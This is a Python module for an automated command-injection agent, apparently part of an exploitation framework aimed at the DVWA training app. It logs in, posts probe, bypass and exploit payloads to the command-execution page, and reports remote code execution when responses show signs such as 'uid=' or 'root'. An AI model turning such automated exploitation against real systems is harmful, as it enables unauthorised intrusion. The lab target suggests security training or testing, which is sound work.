"""Tier 1 command injection agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


CMD_EXEC_SIGNALS = ["uid=", "www-data", "root", "daemon", "bin/bash"]


class CommandInjectionAgent(BaseAgent):
    module_name = "cmdi"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/exec/")
        payload_set = self.payloads.get(self.module_name, level)
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []
        telemetry_events: list[dict[str, Any]] = []

        telemetry_events.append(
            self._emit_telemetry(state, "cmdi_agent.started", {"endpoint": endpoint, "level": level})["telemetry_events"][0]
        )

        if not target_url:
            telemetry_events.append(
                self._emit_telemetry(state, "cmdi_agent.completed", {"score": score, "reason": "no_target_url"})["telemetry_events"][0]
            )
            return {
                **make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                ),
                "telemetry_events": telemetry_events,
            }

        payloads = (
            list(payload_set.probe)
            + list(payload_set.bypass.get(level, []))
            + list(payload_set.exploit)
        )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                telemetry_events.append(
                    self._emit_telemetry(state, "cmdi_agent.completed", {"score": score, "reason": "session_prep_failed"})["telemetry_events"][0]
                )
                return {
                    **make_update(
                        state=state,
                        module_name=self.module_name,
                        score=score,
                        tried_payloads=tried_now,
                    ),
                    "telemetry_events": telemetry_events,
                }

            baseline_marker = "baseline:127.0.0.1"
            baseline_body = ""
            baseline_resp = session.post(endpoint, data={"ip": "127.0.0.1", "Submit": "Submit"})
            baseline_body = baseline_resp.text or ""
            if baseline_marker not in already_tried:
                tried_now.append(baseline_marker)

            for payload in payloads:
                if payload in already_tried:
                    continue
                tried_now.append(payload)
                response = session.post(endpoint, data={"ip": payload, "Submit": "Submit"})
                body = response.text or ""

                if body.strip() and body != baseline_body:
                    score = max(score, 1)

                regex_result = self.verifier.regex_match(body, [r"uid=\d+", r"gid=\d+"])
                signal_result = self.verifier.contains_any(body, CMD_EXEC_SIGNALS)
                telemetry_events.append(
                    self._emit_telemetry(
                        state, "cmdi_agent.probe.result",
                        {"payload": payload, "regex_ok": regex_result.ok, "signal_ok": signal_result.ok,
                         "response_snippet": body[:200]}
                    )["telemetry_events"][0]
                )
                if regex_result.ok or signal_result.ok:
                    score = 4
                    confirmed = ["cmd_injection_confirmed", "rce_achieved"]
                    outcomes = ["rce_achieved"]
                    break
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "cmdi_runtime_error", exc)
        finally:
            session.close()

        telemetry_events.append(
            self._emit_telemetry(state, "cmdi_agent.completed", {"score": score, "confirmed": confirmed})["telemetry_events"][0]
        )
        return {
            **make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
                confirmed_vulns=confirmed,
                achieved_outcomes=outcomes,
            ),
            "telemetry_events": telemetry_events,
        }


_AGENT = CommandInjectionAgent()


def cmdi_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
